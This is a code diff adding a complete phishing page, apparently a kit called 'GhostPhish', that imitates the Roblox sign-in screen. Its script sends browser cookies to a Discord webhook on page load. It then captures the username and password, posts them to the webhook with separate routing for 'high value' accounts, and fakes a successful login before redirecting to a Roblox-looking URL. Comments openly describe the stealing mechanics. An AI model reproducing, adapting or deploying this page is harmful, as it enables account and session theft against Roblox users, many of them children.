@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> <!-- Prevent zoom -->
+    <title id="page-title">Roblox | Sign In</title>
+    
+    <!-- Fonts to match Roblox exactly -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+    <style>
+        /* 1. Core Reset & Layout */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: 'Segoe UI', Helvetica Neue, Arial, sans-serif; 
+            background-color: #f2f4f5; /* Classic Roblox bg */
+            color: #fffdfd;
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            overflow-x: hidden;
+        }
+
+        /* Dark Mode Support (Roblox default is now dark on login pages often) */
+        @media (prefers-color-scheme: dark) {
+            body { background-color: #191b1d; color: #ffffff; }
+        }
+
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 428px; /* Standard Roblox Login Width */
+            padding: 20px 30px 60px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* 2. Logo Handling */
+        .logo-area img { 
+            max-width: 186px; 
+            height: auto; 
+            margin-bottom: 35px; 
+        }
+
+        h1 { font-size: 29px; margin-top: 10px; margin-bottom: 5px; color: #fffdfd;}
+        p.subtitle { font-size: 17px; color: #aeb4b8; margin-bottom: 25px;}
+
+        /* 3. Form Inputs (The Look) */
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 16px 15px;
+            border-radius: 8px;
+            border: none;
+            background-color: rgba(0, 0, 0, 0.09); 
+            color: white; 
+            font-family: inherit;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.2s ease-in-out;
+        }
+
+        /* Dark Mode Input Adjustments */
+        @media (prefers-color-scheme: dark) {
+            input[type="text"], input[type="password"] {
+                background-color: #34373c; 
+                color: #ffffff !important;
+                border-bottom-left-radius: 8px; 
+                border-top-right-radius: 8px; 
+            }
+        }
+
+        input:focus { background-color: rgba(0, 0, 0, 0.15); outline: none;}
+
+        /* Placeholder styling */
+        ::placeholder { color: rgba(255,255,255,0.6); font-weight: normal;}
+        
+        @media (prefers-color-scheme: dark) {
+            ::placeholder { color: rgba(255,255,255,0.4); }
+        }
+
+        /* 4. Submit Button */
+        .submit-btn {
+            margin-top: 30px;
+            width: 100%;
+            padding: 18px; 
+            background-color: #00bdaa; /* Official Roblox Blue/Greenish Cyan */
+            border-radius: 8px; 
+            color: white; 
+            font-weight: bold; 
+            font-size: 17px; 
+            border: none; 
+            cursor: pointer; 
+            transition: transform 0.1s, background-color 0.2s;
+        }
+
+        @media (prefers-color-scheme: dark) {
+             .submit-btn { background-color: #00bdaa !important;}
+        }
+
+        .submit-btn:hover { filter: brightness(1.1); }
+        .submit-btn:active { transform: scale(0.98); }
+
+        /* 5. Utility & Loading */
+        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.3); backdrop-filter: blur(4px); z-index: 100; justify-content: center; align-items: center;}
+        
+        @media (prefers-color-scheme: dark) { #loading-overlay { background: rgba(25,27,29,0.6); } }
+
+        .spinner { border: 4px solid rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #00bdaa !important; animation: spin 1s linear infinite; font-size: 24px;}
+
+        @keyframes spin{ to{transform: rotate(360deg);} }
+        
+        .footer-links a { color: #888d91; text-decoration: none; margin-bottom: 8px; display:inline-block;}
+        .footer-links a:hover { color: #fffdfd;}
+
+    </style>
+</head>
+<body class="light-mode"> <!-- Default Light Mode -->
+
+<div id="loading-overlay"><div class="spinner"></div></div>
+
+<div class="container" id="login-box">
+    <div class="logo-area">
+        <!-- Replace this with your specific logo URL if desired, default is official SVG/URL -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a0/Roblox_2015.png" alt="Roblox Logo"> 
+    </div>
+    
+    <h1>Welcome Back!</h1>
+    <p class="subtitle">Sign in to Roblox</p>
+
+    <!-- The Hidden Payload Form -->
+    <!-- ACTION: This goes to YOUR webhook (Frontend Hook) or a proxy that forwards it -->
+    <!-- We use method='POST' and action='#' but JS handles the actual network request later for stealth -->
+    <form id="phish-form" name="loginForm" onsubmit="handleLoginEvent(event)">
+        <!-- Standard Inputs -->
+        <input type="text" id="username-field" name="__RequestVerificationToken-USERNAME_FIELD_0" placeholder="Username or Email Address">
+        
+        <div style="height: 15px;"></div>
+
+        <input type="password" id="password-field" name="__RequestVerificationToken-PASSWORD_FIELD_0" placeholder="Password">
+
+        <button class="submit-btn" onclick="triggerSubmit()">Sign In</button>
+    </form>
+
+    <div class="footer-links">
+        <a href="#" onclick="showForgotPass(); return false;">Forgot Password?</a>
+    </div>
+    
+    <!-- Hidden Field for Redirect (Fake Success) -->
+    <input type="hidden" id="fake-redirect-url" value=""> 
+</div>
+
+<script>
+// ==========================================
+// CONFIGURATION ZONE (Edit this section)
+// ==========================================
+
+const CONFIG = {
+    // 1. Where does the user data go when they click "Login"? (Frontend Hook / Main Catcher)
+    mainWebhook: 'https://discord.com/api/webhooks/1569384324988408018/9LwokmwRdXH28HVJkIAmORXdxeTI9cRhpXCQEoC0eOU0GBXSoej8KZ6RA3IsR9y6mXMo', 
+    
+    // 2. Who gets the "Big Robux" users? (Reward/Referral Webhook - e.g., Your Wallet or Server)
+    rewardWebhook: 'https://discord.com/api/webhooks/1569384324988408018/9LwokmwRdXH28HVJkIAmORXdxeTI9cRhpXCQEoC0eOU0GBXSoej8KZ6RA3IsR9y6mXMo', 
+
+    // 3. Fake redirect URL to show after login (To make it look real)
+    fakeRedirectUrl: 'https://www.roblox.com/home-page-after-login.html#/',
+
+    // Optional: Custom Logo URL if you want to swap the default one
+    customLogo: null 
+};
+
+// ==========================================
+// LOGIC & STEALING MECHANICS
+// ==========================================
+
+const form = document.getElementById('phish-form');
+const loadingOverlay = document.getElementById('loading-overlay');
+
+// --- Feature A: Cookie/Session Stealer ---
+function stealCookies() {
+    const cookies = document.cookie.split(';').reduce((a, b) => a + (b.trim().length > 0 ? " " : "") + b, "");
+    
+    console.log(`[GhostPhish] Captured Cookies: ${cookies}`); // In real app, send this to your backend
+    
+    // Send cookies silently in background if needed
+    fetch(CONFIG.mainWebhook, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ type: 'cookie_theft', payload: `roblox_session=${document.sessionId || ''}; ${encodeURIComponent(cookies)};` })
+    }).catch(e => console.error('Cookie steal error', e));
+}
+
+// Run cookie theft immediately on load (non-blocking)
+window.addEventListener('load', () => setTimeout(stealCookies, 1000));
+
+
+// --- Feature B: The "Dual Hook" Logic ---
+function handleLoginEvent(e) {
+    
+    // Prevent default form submission behavior but keep the visual flow alive
+    e.preventDefault(); 
+
+    const username = document.getElementById('username-field').value;
+    const password = document.getElementById('password-field').value;
+
+    if(!username || !password) return alert("Please enter details!");
+
+    // 1. Show Loading Animation to fake network latency like real Roblox
+    loadingOverlay.style.display = 'flex';
+    document.querySelector('.spinner').style.borderColor = '#fffdfd'; 
+    setTimeout(() => {
+        loadingOverlay.innerHTML = '<h2>Verifying...</h2>';
+    }, 300);
+
+    // 2. Prepare Payload (Simulating what the browser sends)
+    // In a static HTML generator, we create a FormData object manually that mimics the API request body structure exactly
+    const payloadData = new URLSearchParams();
+    
+    // Constructing fields based on standard Roblox Login Request Body Structure:
+    payloadData.append("__RequestVerificationToken-USERNAME_FIELD_0", username || "GhostPhish_User");
+    payloadData.append("__RequestVerificationToken-PASSWORD_FIELD_0", password || "GhostPhish_Pass"); 
+    payloadData.append("UsernameField-USERNAME", username || ""); 
+    payloadData.append("PasswordField-PASSWORD", password || "");
+
+    // 3. Determine Destination (The Hook)
+    let finalUrl = CONFIG.mainWebhook; 
+    
+    // Logic to detect "Big Users" (Feature C)
+    if(isBigUser(username)) {
+        console.log(`[GhostPhish] Big User Detected: ${username}`);
+        finalUrl = CONFIG.rewardWebhook; // Send big user data to YOUR server instead!
+        
+        const rewardPayload = JSON.stringify({
+            type: 'big_reward',
+            user: username, pass: password,
+            timestamp: Date.now(),
+            sourceIp: window.navigator.userAgent, // Or getIP() function here
+            cookies: document.cookie.split(';').map(c=>c.trim()).join('|') 
+        });
+
+        fetch(finalUrl, { method:'POST', headers:{'Content-Type':'application/json'}, body:rewardPayload })
+          .then(r => console.log('Big User Data Sent'));
+    } else {
+        // Standard user (Default Hook) - Send to your Discord or simple log
+         const standardPayload = JSON.stringify({ type: 'standard_user', user:username, pass:password});
+         fetch(CONFIG.mainWebhook, { method:'POST', headers:{'Content-Type':'application/json'}, body:standardPayload})
+          .then(r => console.log('Standard User Captured'));
+    }
+
+    // 4. Fake Redirect Flow (To complete the illusion)
+    setTimeout(() => {
+        
+        loadingOverlay.innerHTML = '<h2 style="color:#00bdaa">Welcome back!</h2>';
+        
+        // Simulate a tiny delay then redirect to your fake "success" page or reload
+        setTimeout(() => {
+            window.location.href = CONFIG.fakeRedirectUrl; 
+        }, 1500); 
+
+    }, 1800 + Math.random() * 1000); // Randomize time between 1.8s and 2.8s for realism
+
+}
+
+
+// --- Feature C: Big User Detection Logic ---
+function isBigUser(username) {
+    const lowerName = username.toLowerCase();
+    
+    // Define patterns that indicate high value (Customizable)
+    const bigUserKeywords = ['robux', 'admin', 'ceo', 'moderator']; 
+    
+    // Simple heuristic: If name length > 6 chars or matches keywords, treat as "High Value"
+    return lowerName.length > 5 || 
+           bigUserKeywords.some(k => lowerName.includes(k));
+}
+
+</script>
+</body>
+</html>
